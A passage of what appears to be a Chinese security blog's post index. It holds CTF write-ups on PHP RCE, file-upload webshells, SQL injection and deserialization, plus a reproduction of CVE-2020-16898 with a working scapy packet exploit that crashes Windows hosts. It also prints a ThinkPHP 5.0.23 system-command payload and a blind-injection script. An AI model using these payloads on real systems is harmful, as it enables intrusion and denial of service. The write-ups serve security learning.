&quot;phpinfo();&quot;\n\n那么只要把var_dump改成eval()，那么是否phpinfo就会被执行了呢？答案是确实执行了。\n\n试一下system命令，确实你的rce就开始了。\n\n但是注意到这个函数是apache环境才能使用的，所以也是存在一定的局限性的。\nget_defined_vars()为了解决上面的问题，就可以使用这个函数了\nhttps://www.php.net/manual/zh/function.get-defined-vars.php\n这个函数是返回由已经定义变量所组成的数组。\n\n它是返回这4个超级全局变量的数组\n$_GET\n$_POST\n$_FILES\n$_COOKIE\n\n那么就可以利用这个特性通过post传参构造恶意代码或者get传参构造恶意代码。\n\n和之前的思路一样利用一些php的数组函数来提取想要的数据，这里如果不知道用上面函数好，可以去菜鸟教程或PHP手册查询array操作函数。\n\nPOST同理：\n\n但是一般事情没有那么简单，会有过滤的，特别是post或cookie的传参就基本会有过滤，然后cookie也是一样的，毕竟要做校验。\nsession_id()这里我们就是从$_COOKIE下手了，session_id()函数是用来获取/设置 当前会话 ID。\nhttps://www.php.net/manual/zh/function.session-id.php\n可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路\n在cookie处传入PHPSESSID就好了\narray(4) &#123;\n  [\"_GET\"]=>\n  array(1) &#123;\n    [\"cmd\"]=>\n    string(29) \"var_dump(get_defined_vars());\"\n  &#125;\n  [\"_POST\"]=>\n  array(0) &#123;\n  &#125;\n  [\"_COOKIE\"]=>\n  array(1) &#123;\n    [\"PHPSESSION\"]=>\n    string(9) \"phpinfo();\"\n  &#125;\n  [\"_FILES\"]=>\n  array(0) &#123;\n  &#125;\n&#125;\n\n这个还是get_defined_vars()的结果，如果这里要利用就比较麻烦了因为它在倒数第二的位置上。\n这里有一个细节，PHPSESSID=phpinfo()%2b这样才行，因为;被当作分隔而不会被包含进去，使用url编码就好了。\n\n也可以成功，但是payload的就没有那么好搞定了。\nhttp://test/?cmd=eval(current(next(array_reverse(get_defined_vars()))));\n\nCookie: PHPSESSID=phpinfo()%3b\n\n这是老办法，如果使用了session_id()就会不一样了。\nhttp://test/?cmd=eval(session_id(session_start()));\n\nCookie: PHPSESSID=phpinfo()%3b\n\n就好了。\ndirname() &amp; chdir()getcwd()函数可以用来获取当前目录\nscandir()函数可以用来读取目录\ndirname()函数可以跳到上一级目录。\nchdir()函数可以修改当前目录。\nhttp://test/?exp=var_dump(getcwd());\n\nstring(33) \"F:\\SoftWare\\phpstudy_pro\\WWW\\tset\"\n=====================================================\n\nhttp://test/?exp=var_dump(dirname(getcwd()));\n\nstring(28) \"F:\\SoftWare\\phpstudy_pro\\WWW\"\n=====================================================\n\nhttp://test/?exp=var_dump(scandir(dirname(getcwd())));\n\narray(7) &#123; [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(5) \"error\" [3]=> string(10) \"index.html\" [4]=> string(10) \"phpMyAdmin\" [5]=> string(3) \"src\" [6]=> string(4) \"tset\" &#125;\n=====================================================\n\n//读出了上一级目录的zh.php文件\nhttp://test/?cmd=show_source(end(scandir(dirname(chdir(dirname(getcwd()))))));\n\n&lt;?php\n//你找到我了\n$flag = 'flag&#123;A1andNS&#125;';\n?>\n\n这种考法，说到底就是再考PHP功底，看你的对PHP函数和操作的了解情况了。\n参考链接[1]. https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE\n[2]. https://www.php.net/\n","slug":"无参数函数RCE","date":"2020-10-27T08:24:44.000Z","categories_index":"学习笔记","tags_index":"WEB,Bypass","author_index":"A1andNS"},{"id":"1be9c62e526acccb43c839a00721a69f","title":"BUUOJ刷题20201026-31","content":"[MRCTF2020]你传你🐎呢考点：文件上传、图片马\n上传绕过怎么绕呢，试了上传php,php3，php4，phtml都是没过滤了。试了一下jpg和.htaccess文件都可以上传，所以就可以使用图片马，并且直接给出了路径，友好。\n上传一个.htaccess文件\nAddType application&#x2F;x-httpd-php .jpg\n\n然后上传一个图片马\nantsword去连接一下就好了。     \n\n[MRCTF2020]Ez_bypass考点：PHP比较绕过\nI put something in F12 for you\ninclude 'flag.php';\n$flag='MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;';\nif(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) &#123;\n    $id=$_GET['id'];\n    $gg=$_GET['gg'];\n    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;\n        echo 'You got the first step';\n        if(isset($_POST['passwd'])) &#123;\n            $passwd=$_POST['passwd'];\n            if (!is_numeric($passwd))\n            &#123;\n                 if($passwd==1234567)\n                 &#123;\n                     echo 'Good Job!';\n                     highlight_file('flag.php');\n                     die('By Retr_0');\n                 &#125;\n                 else\n                 &#123;\n                     echo \"can you think twice??\";\n                 &#125;\n            &#125;\n            else&#123;\n                echo 'You can not get it !';\n            &#125;\n\n        &#125;\n        else&#123;\n            die('only one way to get the flag');\n        &#125;\n&#125;\n    else &#123;\n        echo \"You are not a real hacker!\";\n    &#125;\n&#125;\nelse&#123;\n    die('Please input first');\n&#125;\n&#125;Please input first\n\n\n[GKCTF2020]cve版签到提示是cve-2020-7066\n\n\n\n\n\n\n\n\n\nPHP（PHP：Hypertext Preprocessor，PHP：超文本预处理器）是PHPGroup和开放源代码社区的共同维护的一种开源的通用计算机脚本语言。该语言主要用于Web开发，支持多种数据库及操作系统。 PHP 7.2.29之前的7.2.x版本、7.3.16之前的7.3.x版本和7.4.4之前的7.4.x版本中的‘get_headers()’函数存在安全漏洞。攻击者可利用该漏洞造成信息泄露。\nget_headers()会截断URL中空字符后的内容\n这是在php7.3中发现的 ，但是一直有这个漏洞\n测试脚本显示这会让恶意脚本获取意外域名的header 。这些header可能泄露敏感信息或者意外地包含攻击者控制的数据。\n看view ctfhub看到了传入到参数url里了。应该是可以ssrf，但是他说只能使用*.ctfhub.com\nHTTP头部显示了Flag in localhost\n试一下http://127.0.0.1%00.ctfhub.com\nArray\n(\n    [0] &#x3D;&gt; HTTP&#x2F;1.1 200 OK\n    [1] &#x3D;&gt; Date: Mon, 26 Oct 2020 14:37:44 GMT\n    [2] &#x3D;&gt; Server: Apache&#x2F;2.4.38 (Debian)\n    [3] &#x3D;&gt; X-Powered-By: PHP&#x2F;7.3.15\n    [4] &#x3D;&gt; Tips: Host must be end with &#39;123&#39;\n    [5] &#x3D;&gt; Vary: Accept-Encoding\n    [6] &#x3D;&gt; Content-Length: 113\n    [7] &#x3D;&gt; Connection: close\n    [8] &#x3D;&gt; Content-Type: text&#x2F;html; charset&#x3D;UTF-8\n)\n\n提示host需要以123结尾，所以改一下\nhttp://127.0.0.123%00.ctfhub.com\n\n[BJDCTF 2nd]old-hack考点：ThinkPHP\n这里上来就是提示TinkPHP5，所以这里应该是要使用ThinkPHP5的漏洞来做。\n可以到这个网站去找paylod:https://www.exploit-db.com/\n\n通过报错信息可以知道ThinkPHP的版本为 5.0.23，PHP版本是5.6.40，一些关键路径，web根目录是/var/www/html/，ThinkPHP目录为/var/www/html/thinkphp\nthinkphp 5.0.23（完整版）debug模式\n32、(post)public&#x2F;index.php (data)_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;touch%20&#x2F;tmp&#x2F;xxx\n\nthinkphp 5.0.23(完整版)\n33、（post）public&#x2F;index.php?s&#x3D;captcha (data) _method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls -al\n\n找到了相应payload，这里也可用kali来收集一下。\n\n下面试一下payload:\nhttp:&#x2F;&#x2F;0ab0e6ac-e952-404d-9cbc-dbf6d7ec8902.node3.buuoj.cn&#x2F;?s&#x3D;captcha\n#post data content\n_method&#x3D;__construct&amp;filter%5B%5D&#x3D;system&amp;method&#x3D;get&amp;server%5BREQUEST_METHOD%5D&#x3D;ls+&#x2F;\n\n\n改用cat /flag，就可以读到flag。\n这题考察的是ThinkPHP的RCE漏洞，这里就考察到一定的信息收集能力，找到漏洞的利用payload的比较关键。\n当然可以执行命令了，也可以写一个shell进去。\n[GXYCTF2019]禁止套娃考点：.git文件泄露，无参数函数RCE\n打开网页没有找到任何有用信息，使用dirsearch扫描一下后台看看情况，buu对请求数量有限制，这要设置延迟，不然什么都收集不到。\n\n使用githack把目录clone到本地。\n得到index.php的源代码：\n&lt;?php\ninclude \"flag.php\";\necho \"flag在哪里呢？&lt;br>\";\nif(isset($_GET['exp']))&#123;\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) &#123;\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) &#123;\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) &#123;\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            &#125;\n            else&#123;\n                die(\"还差一点哦！\");\n            &#125;\n        &#125;\n        else&#123;\n            die(\"再好好想想！\");\n        &#125;\n    &#125;\n    else&#123;\n        die(\"还想读flag，臭弟弟！\");\n    &#125;\n&#125;\n// highlight_file(__FILE__);\n?>\n\n\n做了过滤了，data://，filter://，php://，phar://都被过滤了\n(?R)” 来表示嵌套部分，同时还正则匹配了/et|na|info|dec|bin|hex|oct|pi|log/i这就使得很多函数用不了。\n这里匹配要求函数无参数，所以要想办法来获取信息，想办法读取flag.php内容。这里有一个知识点，利用两个函数的嵌套来代替.\ncurrent(localeconv()),其中localeconv()函数是用来返回一包含本地数字和货币格式信息的数组。\n参考url:https://www.w3school.com.cn/php/func_string_localeconv.asp\ncurrent()函数的作用是输出数组中的当前袁术的值，每个数组中都有一个内部指针指向它的当前元素，初始指向插入到数组中的第一个元素。\n\n所以current(localeconv())实际上就是表示.，因此一个无参数函数就可以构建了，\nexp&#x3D;print_r(scandir(current(localeconv())));\n\n\n目录情况就是一个.git + flag.php + index.php了。\n这样可以得到的就是一个数组类型数据，倒数第二个元素就是我们要的flag.php，所以思路和上面是一样的，那么如何返回倒数第二个元素呢？这里就要去查一下数组操作函数有哪些了。\n发现有一个函数是array_rand():从数组中随机选出一个或多个元素，返回键名。\n方法一：localeconv()array_flip():反转/交换数组中的键名和对应关联的键值。\n可以先把键和值交换，然后用array_rand()随机返回键名，这样就可以读出flag.php\nexp&#x3D;show_source(array_rand(array_flip(scandir(current(localeconv())))));\n\n\n方法二：reverse()先用array_reverse()函数逆序排列数组，然后结合next()函数把指针后移一位，就得到flag.php，集合show_source()函数就可以读了。\n\n方法三：session方法\n[GXYCTF2019]BabyUpload考点：文件上传\n上传PHP提示不能上传后缀不能有ph，大小写后缀绕不过，这样的过滤，一些常用的后最都用不了了。光改后缀为jpg，提示太露骨了，把类型一起改了就提示明明是php，那就一起价格文件头\n经过一番探查发现是&lt;?被过滤了。\n\n使用script脚本方式绕过，成功上传一个图片，看看能不能上传一个.htaccess文件。\n\nantsword连接get flag\n\n[安洵杯 2019]easy_web上来是图片没有上面，看一下源码，里面写着md5 is funny ~，url处传入了一个img和cmd\nimg处是一个base64编码：解到最后是3535352e706e67，这是个16进制编码，解开后是555.png，这说明会读取文件以base64形式返回。在cmd处输入命令试试,输入ls，cat，$，显示被禁止。这里可以利用前面的图片点来获取源码，因为之前我们发现imag处传入的是先对文件名进行16进制转换，然后在做两次base64编码，所以我们吧index.php做如上操作，就可以得到源代码。\n&lt;?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) &#123;\n    echo '&lt;img src =\"./ctf3.jpeg\">';\n    die(\"xixi～ no flag\");\n&#125; else &#123;\n    $txt = base64_encode(file_get_contents($file));\n    echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'>&lt;/img>\";\n    echo \"&lt;br>\";\n&#125;\necho $cmd;\necho \"&lt;br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|>/i\", $cmd)) &#123;\n    echo(\"forbid ~\");\n    echo \"&lt;br>\";\n&#125; else &#123;\n    if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) &#123;\n        echo `$cmd`;\n    &#125; else &#123;\n        echo (\"md5 is funny ~\");\n    &#125;\n&#125;\n\n?>\n&lt;html>\n&lt;style>\n  body&#123;\n   background:url(./bj.png)  no-repeat center center;\n   background-size:cover;\n   background-attachment:fixed;\n   background-color:#CCCCCC;\n&#125;\n&lt;/style>\n&lt;body>\n&lt;/body>\n&lt;/html>\n\n好家伙过滤了挺多的命令,没法直接用数组绕过md5验证，因为数组的string后都是”array”\n考察的时md5的强验证，这里有一个payload可以用：\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%\n\n\nflag在根目录下\ncat被过滤了，但是可以使用\\绕过，比如ca\\t+/flag绕过，ta\\c+/flag绕过\n\n或者使用sort命令，sort+/flag来绕过\n\n","slug":"BUUOJ刷题20201026-31","date":"2020-10-26T11:30:40.000Z","categories_index":"CTF","tags_index":"WEB,BUUOJ","author_index":"A1andNS"},{"id":"78ded4e7cb4de2a6c1a7e1af4840fe78","title":"CVE-2020-16898 Windows tcp/ip远程代码执行漏洞复现","content":"这个月的微软安全更新日，微软发布了补丁修复，TCP/IP远程执行代码漏洞(CVE-2020-16898),官方评级严重，漏洞评分： 9.8，这里来复现一下漏洞利用，至于照成栈溢出，我就不太知道。\n漏洞简述远程攻击者通过 构造特制的ICMPv6 Router Advertisement（路由通告）数据包 ，并将其发送到远程Windows主机上，即可在目标主机上执行 任意代码 。\n风险等级360CERT对该漏洞的评定结果如下\n\n\n\n评定方式\n等级\n\n\n\n威胁等级\n严重\n\n\n影响面\n广泛\n\n\n360CERT评分\n9.8\n\n\n影响版本\n\n\n\n\n\n\n\n\n\nmicrosoft:window_server_2019:* /1903/1909/2004\nmicrosoft:window_server_2019:*\nmicrosoft:window_server:1903/1909/2004\n\n环境搭建\n\n\n\n\n\n\n\n\n攻击机: Windows 10 (Python 3.9, 拥有scapy依赖库)\n靶机环境: Winodws 10 2004\n\n开启ipv6\n\n可以查看到靶机的IPv6地址为fd15:4ba5:5a2b:1008:f443:ccec:d56:9cf0\n\n查看攻击机的IPv6地址为 fe80::248f:7f13:3907:8dac%10\n\n这里房间搭建的重要点是靶机我们使用的ipv6地址需要是ipv6地址或临时ipv6地址，而我们物理机（攻击机）则要用本地链接ipv6地址作为地址使用，同时必须要保证攻击机和靶机之间网络的畅通\n漏洞情况成因根据rfc5006 描述，RDNSS包的length应为奇数，而当攻击者构造的RDNSS包的Length为偶数时，Windows TCP/IP 在检查包过程中会根据Length来获取每个包的偏移，遍历解析，导致对 Addresses of IPv6 Recursive DNS Servers 和下一个 RDNSS 选项的边界解析错误，从而绕过验证，将攻击者伪造的option包进行解析，造成栈溢出，从而导致系统崩溃。\n漏洞利用检测脚本挂一个Github链接，大佬的漏洞检测脚本https://github.com/CPO-EH/CVE-2020-16898_Checker/blob/main/CVE-2020-16898_Checker.ps1\n这里检测脚本要使用的话要用到一些语法才行：\nPowerShell.exe -ExecutionPolicy UnRestricted -File .\\CVE-2020-16898_Checker\n\n成功检测出了漏洞的存在。\n\n下面使用exp去打它试试看。\n#来自大佬的exp\nfrom scapy.all import *\nfrom scapy.layers.inet6 import ICMPv6NDOptEFA, ICMPv6NDOptRDNSS, ICMPv6ND_RA, IPv6, IPv6ExtHdrFragment, fragment6\n \nv6_dst = \"fd15:4ba5:5a2b:1008:f443:ccec:d56:9cf0\"\nv6_src = \"fe80::501a:49b7:b7d:5362%12\"\n \np_test_half = 'A'.encode()*8 + b\"\\x18\\x30\" + b\"\\xFF\\x18\"\np_test = p_test_half + 'A'.encode()*4\n \nc = ICMPv6NDOptEFA()\n \ne = ICMPv6NDOptRDNSS()\ne.len = 21\ne.dns = [\n\"AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA\",\n\"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\",\n\"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\",\n\"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\",\n\"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\",\n\"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\",\n\"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\",\n\"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\",\n\"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\",\n\"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA\" ]\naaa = ICMPv6NDOptRDNSS()\naaa.len = 8\npkt = ICMPv6ND_RA() / aaa / \\\n      Raw(load='A'.encode()*16*2 + p_test_half + b\"\\x18\\xa0\"*6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e\n \np_test_frag = IPv6(dst=v6_dst, src=v6_src, hlim=255)/ \\\n              IPv6ExtHdrFragment()/pkt\n \nl=fragment6(p_test_frag, 200)\n \nfor p in l:\n    send(p)\n\n下面就用这个exp去打，同时使用wireshark抓取数据包。这段payload作用是构造特定ipv6数据包，发送给受害者机器，让受害机器蓝屏\n\n靶机蓝屏了\n\n抓包信息，这就是发送的攻击数据。\n\n参考文献[1]. https://blog.csdn.net/mukami0621/article/details/109165574[2]. https://cert.360.cn/report/detail?id=771d8ddc2d703071d5761b6a2b139793[3]. https://blog.csdn.net/hsj_csdn/article/details/109138162\n","slug":"CVE-2020-16898-Windows-tcp-ip远程代码执行漏洞复现","date":"2020-10-26T07:03:53.000Z","categories_index":"漏洞复现","tags_index":"网络安全,漏洞复现","author_index":"A1andNS"},{"id":"7de36a2800aed7f2e49e9214b2b8f9f5","title":"BUUOJ刷题20201019-25","content":"[ZJCTF 2019]NiZhuanSiWei考点：代码审计、PHP伪协议\n&lt;?php  \n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\n$password = $_GET[\"password\"];\nif(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\"))&#123;\n    echo \"&lt;br>&lt;h1>\".file_get_contents($text,'r').\"&lt;/h1>&lt;/br>\";\n    if(preg_match(\"/flag/\",$file))&#123;\n        echo \"Not now!\";\n        exit(); \n    &#125;else&#123;\n        include($file);  //useless.php\n        $password = unserialize($password);\n        echo $password;\n    &#125;\n&#125;\nelse&#123;\n    highlight_file(__FILE__);\n&#125;\n?>\n\n首先需要先传入text一个文件内容为“welcome to the zjctf”,然后在传入file参数不能包含flag字段，还有一个反序列化的密码。\n这里先绕过第一个点，读入一个文件包含上面所得welcom的那些内容。这里php://input肯定是用不了了，可以考虑使用data协议，虽然data协议被用来执行PHP代码，但是依旧可以只传入字符串，让其读取。\ndata:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;\n\n回现了相关字样，说明绕过第一步了，下面继续。既然不然用flag字符串，那就先看看别的源码\nuseless.php\n&lt;?php  \n\nclass Flag&#123;  //flag.php  \n    public $file;  \n    public function __tostring()&#123;  \n        if(isset($this->file))&#123;  \n            echo file_get_contents($this->file); \n            echo \"&lt;br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        &#125;  \n    &#125;  \n&#125;  \n?>  \n\n\n简单反序列化,在echo password的时候触发__tostring()方法。\npayload:\ntext&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;\n\n\n&lt;br&gt;&lt;h1&gt;welcome to the zjctf&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;  \n&lt;br&gt;oh u find it &lt;&#x2F;br&gt;\n\n&lt;!--but i cant give it to u now--&gt;\n\n&lt;?php\n\nif(2&#x3D;&#x3D;&#x3D;3)&#123;  \n\treturn (&quot;flag&#123;fd2c8122-5a71-4603-9263-2163ead53b4c&#125;&quot;);\n&#125;\n\n?&gt;\n&lt;br&gt;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ\n\n[CISCN2019 华北赛区 Day2 Web1]Hack World考点：sql注入、布尔盲注\nsql注入，推测是数字型注入，然后对一些东西做了过滤，例如空格、#、*、or、and，不过还是有一些没有被过滤的。\n这里有四种显示，一种是查询到信息，一种是bool(false)，一种是error,一种是sql注入被检测。\n看懂bool联想到应该是要bool盲注\nimport requests\nimport time\n\nurl = 'http://952f8ab6-3769-4f45-860a-e48ac1dd99f4.node3.buuoj.cn/index.php'\ndata = &#123;\"id\": \"\"&#125;\nflag = 'flag&#123;'\n\ni = 6\nwhile True:\n    begin = 32\n    end = 126\n    mid = (begin + end) // 2\n    while begin &lt; end:\n        print(begin, mid, end)\n        time.sleep(1)\t#这里必须设置停顿一秒，不然会触发请求过多了，而导致出错\n        data[\"id\"] = \"if(ascii(substr((select(flag)from(flag),&#123;&#125;,1))>&#123;&#125;,1,2)\".format(i, mid)\n        r = requests.post(url, data=data)\n        if 'Hello' in r.text:\n            begin = mid + 1\n            mid = (begin + end) // 2\n        else:\n            end = mid\n            mid = (begin + end) // 2\n\n    flag += chr(mid)\n    print(flag)\n    i += 1\n    if flag[-1] == '&#125;':\n        break\n\n\n[极客大挑战 2019]HardSQL考点：SQL注入、报错注入\n#不能直接用%23就可以了\nusername&#x3D;admin&amp;password&#x3D;123&#39;+or+1&#x3D;1%23\n\n登录进去什么都没有，只有一句“你可别被我逮住了，臭弟弟”，试了一下，有过滤，空格，union，by，and，=用不了，空格可以用()包裹的方式来避开使用。=号可以使用like来代替。看看报错注入。\nUPDATEXML (XML_document, XPath_string, new_value);\n\n\n\n\n\n\n\n\n\n第一个参数：XML_document是String格式，为XML文档对象的名称第二个参数：XPath_string (Xpath格式的字符串)第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值报错注入原理：当XPath_string()不满足格式的时候，会报错并把查询信息放到报错信息里通常用 ’ ~ ’制造语法错误用\n还要用到一个Like,基本用法\nLike 匹配开头是&#39;per%&#39;Like 匹配结尾是&#39;%per&#39;Like 匹配中间包含&#39;%per%&#39;Like 匹配不包含 &#39;%per%&#39;\npayload:\n1'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23\n\n\n数据库名为geek\n1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))%23\n\n\n表名为H4rDsq1\n1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23\n\n\n列名：id,username,password\n1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23\n\n\n显示不全:flag{956cbb6f-a48d-4ece-bf4c-19\n想用substr()，发现被过滤了。试试mid，也被过滤。left,right可以用，用right读出字符串右边内容。\n\n1'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e),1))%23\n\nf-a48d-4ece-bf4c-199301ac2b94}\n这里合并两个字符串，还要注意找一下不要重复了。\nflag{956cbb6f-a48d-4ece-bf4c-199301ac2b94}\n[GXYCTF2019]BabySQli考点：SQL查询绕过验证\n如果用户不存在会wrong user，密码错误则是用户存在。\n用户admin是存在的。pw处不报错，name处报错\nor，=，(、）被过滤了，尝试url编码绕不过，大小写可以绕过\nname&#x3D;admin&#39;oRder by 3%23&amp;pw&#x3D;1\n\n列数为3列，常规不太好做，回显都是passwd wrong\n发现源码里面的一个注释，这是个base32，由大写字母和数字组成。\nMMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5\n解码后得到一个base64编码\nc2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;\n\n解一下\nselect * from user where username &#x3D; &#39;$name&#39;\n\n这是查询使用的sql语句，这也就是为什么我在pw处没有试出报错,这里的逻辑应该是，用用户名去查信息，然后用返回的信息来和密码做对比，来判断是否成功。\n这里有一个联合注入的细节：\nselect * from user where username = 'Alan' union select 1,admin,202cb962ac59075b964b07152d234b70,4%23\n\npayload:\n1&#39; union select 1,admin,202cb962ac59075b964b07152d234b70%23&amp;pw&#x3D;123\n\n\n本地上mysql试了一下就是这样的结果：\n\n[网鼎杯 2020 青龙组]AreUSerialz考点：PHP反序列化、PHP强、弱类型比较、代码审计\n&lt;?php\n\ninclude(\"flag.php\");\n\nhighlight_file(__FILE__);\n\nclass FileHandler &#123;\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() &#123;\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    &#125;\n\n    public function process() &#123;\n        if($this->op == \"1\") &#123;\n            $this->write();\n        &#125; else if($this->op == \"2\") &#123;\n            $res = $this->read();\n            $this->output($res);\n        &#125; else &#123;\n            $this->output(\"Bad Hacker!\");\n        &#125;\n    &#125;\n\n    private function write() &#123;\n        if(isset($this->filename) &amp;&amp; isset($this->content)) &#123;\n            if(strlen((string)$this->content) > 100) &#123;\n                $this->output(\"Too long!\");\n                die();\n            &#125;\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        &#125; else &#123;\n            $this->output(\"Failed!\");\n        &#125;\n    &#125;\n\n    private function read() &#123;\n        $res = \"\";\n        if(isset($this->filename)) &#123;\n            $res = file_get_contents($this->filename);\n        &#125;\n        return $res;\n    &#125;\n\n    private function output($s) &#123;\n        echo \"[Result]: &lt;br>\";\n        echo $s;\n    &#125;\n\n    function __destruct() &#123;\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    &#125;\n\n&#125;\n\nfunction is_valid($s) &#123;\n    for($i = 0; $i &lt; strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 &amp;&amp; ord($s[$i]) &lt;= 125))\n            return false;\n    return true;\n&#125;\n\nif(isset($_GET&#123;'str'&#125;)) &#123;\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) &#123;\n        $obj = unserialize($str);\n    &#125;\n\n&#125;\n\n先看FileHandler类，这里在构造时默认设置为写操作会调用process，process函数会根据op属性的值来调用write、read、output等函数。跟进到这三个函数，write函数要求content属性的长度不能超过100，然后把content写入到filename文件中。read函数就是从filename文件中读取内容。output函数是一个普通的字符串输出函数。在类对象销毁时会判断op是否为2，如果是就重置为1，然后把文件清空。\n然后看一下合法性验证函数，这里主要是输入的字符必须是可显示字符。\n通过str传参进去，只要通过验证就会做反序列化操作。\n注意到析构函数使用的是一个===的强类型比较，而在process函数中的则是使用的==弱类型的比较，所以我们只要把op设置为一个整数的2就可以绕过这个限制了。\n利用php7.1+版本对属性类型不敏感，我们可以直接把protect改成public来构造payload，因为protect类型序列化会产生一个%00的不可显示字符，这样就字符串非法了。\nexp：\n&lt;?php\nclass FileHandler &#123;\n\n    public $op=2;\n    public $filename=\"flag.php\";\n    public $content;\n\n    function __construct() &#123;\n        $op = \"1\";\n        $filename = \"flag.php\";\n        $content = \"Hello World!\";\n        $this->process();\n    &#125;\n\n    public function process() &#123;\n        if($this->op == \"1\") &#123;\n            $this->write();\n        &#125; else if($this->op == \"2\") &#123;\n            $res = $this->read();\n            $this->output($res);\n        &#125; else &#123;\n            $this->output(\"Bad Hacker!\");\n        &#125;\n    &#125;\n\n    private function write() &#123;\n        if(isset($this->filename) &amp;&amp; isset($this->content)) &#123;\n            if(strlen((string)$this->content) > 100) &#123;\n                $this->output(\"Too long!\");\n                die();\n            &#125;\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        &#125; else &#123;\n            $this->output(\"Failed!\");\n        &#125;\n    &#125;\n\n    private function read() &#123;\n        $res = \"\";\n        if(isset($this->filename)) &#123;\n            $res = file_get_contents($this->filename);\n        &#125;\n        return $res;\n    &#125;\n\n    private function output($s) &#123;\n        echo \"[Result]: &lt;br>\";\n        echo $s;\n    &#125;\n\n    function __destruct() &#123;\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        